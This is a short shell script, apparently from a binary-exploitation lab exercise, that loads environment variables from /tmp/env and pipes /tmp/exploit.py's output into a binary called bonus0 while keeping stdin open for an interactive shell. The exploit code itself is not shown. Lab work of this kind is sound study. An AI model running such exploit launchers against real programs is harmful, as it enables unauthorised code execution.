set -a
source /tmp/env
set +a
(python /tmp/exploit.py; cat -) | ./bonus0